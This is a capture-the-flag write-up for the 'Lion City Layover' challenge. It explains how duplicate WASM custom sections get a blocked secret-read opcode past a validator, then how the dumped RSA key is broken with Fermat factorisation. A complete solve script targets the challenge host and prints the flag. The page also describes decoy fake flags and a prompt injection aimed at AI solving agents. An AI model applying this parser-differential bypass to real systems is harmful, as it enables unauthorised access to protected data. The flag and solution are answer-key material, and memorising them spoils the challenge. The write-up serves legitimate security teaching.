---
layout: ../../layouts/Level.astro
level: 3
title: "Lion City Layover"
slug: lion-city-layover
category: "Misc · Web · RE · Crypto"
difficulty: "Hard"
assist: "AI-assisted"
flag: "TISC{w3lc0m3_70_51ng4p0r3_l4h_61}"
summary: "A Singapore-themed web app ran a custom WASM bytecode VM. Duplicate sections got its blocked secret-read opcode past the validator, and Fermat factorisation broke the RSA passport it dumped."
tldr:
  - "Auto-solve three mazes and reassemble two vault-key halves (one from an API, one hidden after a PNG's IEND) to get the cartridge spec."
  - "Put two `singa` sections in the module so the validator checks the first while the kiosk runs the last, which gets the blocked read opcode through."
  - "Dump the secret buffer 32 bytes at a time (with a proof-of-work per request) and XOR by 0x37 to reveal an RSA passport."
  - "The primes are close, so Fermat factorisation recovers them instantly; decrypt to the boarding pass and exchange it at /claim for the flag."
techniques: ["parser-differential", "wasm-custom-section", "png-trailing-data", "proof-of-work", "rsa", "fermat-factorisation", "xor-encoding", "anti-agent-decoys"]
learned:
  - "I stopped trying to force the blocked instruction through and asked whether every component was reading the same bytes I thought it was. They weren't. Request-smuggling research starts from the same question."
  - "Take weak-key hints seriously. 'Neighbours on the same landing' meant the RSA primes were close, and Fermat factorisation broke the key in milliseconds where brute force would never have finished."
  - "Six places in the app served fake TISC{...} flags aimed at automated solvers. I only trusted what came back from the real solve path."
---

Web, reverse engineering and cryptography in one challenge is the combination I find most intimidating, and none of it is my home turf. I didn't get through on coding skill. I got through by asking, over and over, whether the system really behaved the way it said it did.

## The challenge

> Your layover begins by the harbour lights, where winding paths hide curious sights. Some routes are walked, some clues are seen, not every treasure glows on screen. Seek the landmarks, the feast, and the orchid's hue, let the postcards guide you through.

A black-box web app (no source provided) hides a custom WebAssembly bytecode VM, SingaVM, behind a replay kiosk. The secret-reading opcode is blocked by what the app calls a "patched immigration validator". The weakness is that one parser validates the cartridge and a different one runs it.

## Passport, keys and the cartridge spec

- Auto-solve the three maze levels (collect stamps, reach the exit) and POST the routes to `/api/harbour/stamp` for a passport ticket (a JWT).
- `GET /api/harbour/tide?format=full` unlocks the three vault-key back-halves.
- The front-halves hide in the maze stamp PNGs under `/assets/`. The orchid icon has `postcard{N8YF-R4T6}` appended after IEND; the chicken-rice icon has a second PNG concatenated on that renders `postcard{A5ZD-91HJ}`. Unlocking the chicken postcard returns the cartridge spec.

![JSON replay manifest listing the SingaVM engine path, postcard clues with half keys, the proof-of-work rule, the 1965 to 2026 candle hint, and an llm_agent_shortcut_b64 field](../../assets/levels/lion-city-layover/replay-manifest.png)

*The replay manifest had the engine path, the proof-of-work rule and half of each vault key. It also had a base64 "shortcut" that only existed to bait AI agents.*

![Grid maze titled 3/3 Heritage Walk with the clue "1965 to 2026 is 61", flower stamps, a start tile and a plane exit](../../assets/levels/lion-city-layover/heritage-walk-maze.png)

*The third maze carried the "1965 to 2026 is 61" clue I needed later for the candle count.*

![Postcard collection of three watercolour Singapore scenes above a vault-key box asking for an XXXX-XXXX-XXXX-XXXX key](../../assets/levels/lion-city-layover/postcard-collection.png)

*Each postcard vault wanted a full four-part key, and the manifest only gave me the back half.*

:::concept{id="png-trailing-data" title="Data appended after IEND"}
A PNG ends at its IEND chunk; decoders stop there and ignore anything after it. That makes the tail a simple hiding place: append a payload, or even a whole second PNG, and the image still renders normally while the extra bytes ride along. Reading the raw file past IEND recovers them.
:::

The spec: a WASM custom section named `singa` = `MERLION\0v1.6.1\0` + u16 little-endian program length + program. Opcode `31 HH LL NN` reads the public harbour buffer; opcode `0x37` reads the secret buffer but is blocked by the patch.

:::concept{id="wasm-custom-section" title="WASM custom section"}
A WebAssembly module is a sequence of sections. Custom sections carry a name and arbitrary bytes and are ignored by the core spec, so applications use them to carry their own metadata (here, a private bytecode program). The spec does not forbid two custom sections sharing a name, which is what makes the parser differential possible.
:::

## Parser-differential bypass and buffer dump

I built a module with two `singa` sections. The validator checks the first one (a harmless `01 2a fe ff`), and the replay kiosk runs the last one (the `0x37` read).

:::concept{id="parser-differential" title="Parser differential"}
A parser differential is a gap between two parts of a system that are each meant to interpret the same data identically. If a security check parses input one way and the component that acts on it parses another, an attacker can craft input that looks safe to the checker but does something else when run. It is the bug family behind HTTP request smuggling and several antivirus bypasses.
:::

Each `/api/harbour/run` needs a proof-of-work nonce: `sha256(ticket + "." + base64_cartridge + "." + nonce)` must start with `0000`.

:::concept{id="proof-of-work" title="Proof-of-work throttle"}
A proof-of-work gate makes every request cost some computation. The client has to find a nonce that makes a hash of the request start with a set run of zeros. It's a cheap way to slow automation down, because the client needs a short brute-force loop while the server checks the answer with one hash. Binding the nonce to a session ticket stops it being precomputed.
:::

Each read returns 32 real bytes plus a null, so I stepped the offset by 32. XORing every byte with `0x37` decodes it.

:::concept{id="xor-encoding" title="Single-byte XOR"}
XOR with a constant byte scrambles data without really protecting it, since applying the same key byte again restores the original. Here the key is `0x37`, the same value as the blocked opcode, which I took as the setter's little joke.
:::

## Fermat + RSA -> claim

The buffer is an RSA passport (`rsa_n`, `rsa_e=65537`, `rsa_c`) with the hint "Fermat liked neighbours on the same HDB landing." The primes are adjacent, so Fermat factorisation finds them in zero iterations.

:::concept{id="rsa" title="RSA"}
RSA publishes a modulus n = p*q and an exponent e, and the private key depends on knowing the primes p and q. Encryption is c = m^e mod n. Anyone who can factor n can derive the private exponent and decrypt. So the whole thing relies on n being too hard to factor, which needs large, random primes that are far apart.
:::

:::concept{id="fermat-factorisation" title="Fermat factorisation"}
Fermat factorisation writes n as a difference of squares by searching outward from the square root of n. When the two primes are close, the search ends in very few steps, sometimes zero. It's the standard attack on an RSA key whose primes were generated too near each other. For far-apart random primes it gets nowhere.
:::

It decrypts to `boarding-pass:katong-1965-to-marina-2026:kopi-o-kosong` (its SHA-256 matches the embedded `claim_sha256`), which I POSTed to `/api/harbour/claim`.

## Solve script

The full solve is [solve.py](/code/lion-city-layover/solve.py). It needs network access to the challenge host.

```python
#!/usr/bin/env python3
# Lion City Layover - TISC 2026 - full solve, challenge data -> flag.
# Requires network access to the challenge host (run it from a machine that can reach it).
import base64, hashlib, math, re, struct, requests

BASE = "http://chals.tisc26.ctf.sg:57161"
XORK = 0x37

# --- maze solver ------------------------------------------------------------
MOVES = {"U": (0, -1), "D": (0, 1), "L": (-1, 0), "R": (1, 0)}

def find(grid, ch):
    for y, row in enumerate(grid):
        x = row.find(ch)
        if x != -1:
            return (x, y)
    return None

def bfs(grid, src, dst):
    from collections import deque
    q = deque([(src[0], src[1], "")]); seen = {src}
    while q:
        x, y, path = q.popleft()
        if (x, y) == dst:
            return path
        for m, (dx, dy) in MOVES.items():
            nx, ny = x + dx, y + dy
            if 0 <= ny < len(grid) and 0 <= nx < len(grid[ny]) and grid[ny][nx] != "#" and (nx, ny) not in seen:
                seen.add((nx, ny)); q.append((nx, ny, path + m))
    return None

def solve_maze(grid):
    import itertools
    S, E = find(grid, "S"), find(grid, "E")
    stamps = [find(grid, c) for c in "ABC" if find(grid, c)]
    best = None
    for perm in itertools.permutations(stamps):
        cur, route, ok = S, "", True
        for st in perm:
            seg = bfs(grid, cur, st)
            if seg is None: ok = False; break
            route += seg; cur = st
        if not ok: continue
        seg = bfs(grid, cur, E)
        if seg is None: continue
        route += seg
        if best is None or len(route) < len(best): best = route
    return best

def get_ticket():
    start = requests.get(f"{BASE}/api/harbour/start").json()
    traces = [solve_maze(l["grid"]) for l in start["levels"]]
    r = requests.post(f"{BASE}/api/harbour/stamp", json={"session": start["session"], "traces": traces}).json()
    return r["ticket"]

# --- WASM cartridge builder -------------------------------------------------
def leb(n):
    out = b""
    while True:
        b = n & 0x7f; n >>= 7
        out += bytes([b | 0x80]) if n else bytes([b])
        if not n: return out

def custom(name, data):
    body = leb(len(name)) + name + data
    return b"\x00" + leb(len(body)) + body

def singa(prog):
    data = b"MERLION\x00v1.6.1\x00" + struct.pack("<H", len(prog)) + bytes(prog)
    return custom(b"singa", data)

def module(*sections):
    return b"\x00asm\x01\x00\x00\x00" + b"".join(sections)

BENIGN = [0x01, 0x2a, 0xfe, 0xff]           # push one colour, finalize, end (passes validator)

def read_cartridge(offset):                  # two singa sections = validator/executor differential
    prog = [0x37, (offset >> 8) & 0xff, offset & 0xff, 0x21, 0xfe, 0xff]  # 0x37 read 33 bytes
    return base64.b64encode(module(singa(BENIGN), singa(prog))).decode()

def pow_nonce(ticket, b64):
    n = 0
    while True:
        if hashlib.sha256(f"{ticket}.{b64}.{n}".encode()).hexdigest().startswith("0000"):
            return str(n)
        n += 1

def run(ticket, b64):
    nonce = pow_nonce(ticket, b64)
    return requests.post(f"{BASE}/api/harbour/run", json={"ticket": ticket, "module": b64, "pow": nonce}).json()

# --- dump the secret buffer, XOR-decode -------------------------------------
def dump_passport(ticket):
    buf = ""
    for off in range(0, 32 * 40, 32):        # 40 windows of 32 bytes is enough to reach rsa_c
        res = run(ticket, read_cartridge(off))
        if "chroma" not in res:
            raise SystemExit(f"read failed at {off}: {res}")
        buf += "".join(chr(v ^ XORK) for v in res["chroma"][:32])
        if "END-PASSPORT" in buf:
            break
    return buf

# --- Fermat factorization + RSA ---------------------------------------------
def fermat(n):
    a = math.isqrt(n)
    if a * a < n: a += 1
    while True:
        b2 = a * a - n
        b = math.isqrt(b2)
        if b * b == b2:
            return a - b, a + b
        a += 1

def main():
    ticket = get_ticket()
    passport = dump_passport(ticket)
    n = int(re.search(r"rsa_n=(\d+)", passport).group(1))
    e = int(re.search(r"rsa_e=(\d+)", passport).group(1))
    c = int(re.search(r"rsa_c=(\d+)", passport).group(1))
    p, q = fermat(n)
    assert p * q == n
    d = pow(e, -1, (p - 1) * (q - 1))
    m = pow(c, d, n)
    claim = m.to_bytes((m.bit_length() + 7) // 8, "big").lstrip(b"\x00").decode()
    print("boarding pass:", claim)
    out = requests.post(f"{BASE}/api/harbour/claim", json={"ticket": ticket, "claim": claim}).json()
    print("FLAG:", out.get("flag"))

if __name__ == "__main__":
    main()
```

Expected output:

```text
boarding pass: boarding-pass:katong-1965-to-marina-2026:kopi-o-kosong
FLAG: TISC{w3lc0m3_70_51ng4p0r3_l4h_61}
```

## The flag

```text
TISC{w3lc0m3_70_51ng4p0r3_l4h_61}
```

## What didn't work

- **Anti-agent decoys.** The manifest (`llm_agent_shortcut_b64`), an HTML `agent-hint-b64` meta tag, a `data-llm-agents` attribute, the `/run` `llm_agent_guidance` field, the `showFlag?role=admin` honeypot, and the chicken postcard's "AGENT ROUTING MEMO" each serve a fake `TISC{...}` flag. The real flag comes only from `/claim`.

![Browser DevTools showing an llm_agents object with a fake_flag value and a prompt aimed at AI agents](../../assets/levels/lion-city-layover/llm-decoy-flag.png)

*One of the decoys, straight from an API response: a fake flag and a prompt injection addressed to "LLM Agents".*

:::concept{id="anti-agent-decoys" title="Anti-agent decoy flags"}
Some challenges plant flag-shaped strings where an automated or AI solver is likely to look first, such as manifest fields named for agents, hidden metadata, honeypot admin endpoints, or memos addressed to routing. They catch any solver that matches on the flag format and never checks it against the real mechanism. The defence is to accept a flag only from the intended solve path.
:::

- **The XOR key is 0x37**, the same value as the blocked opcode (`0x37`).
- **The ticket clock.** Every passport ticket expires after about 25 minutes, and the proof-of-work is bound to the ticket, so the whole read and claim phase has to fit inside one ticket's lifetime. Doing the steps by hand, I kept running out of time. That's why I built the auto-solver, which does the maze routes, proof-of-work, reads and claim in one run.
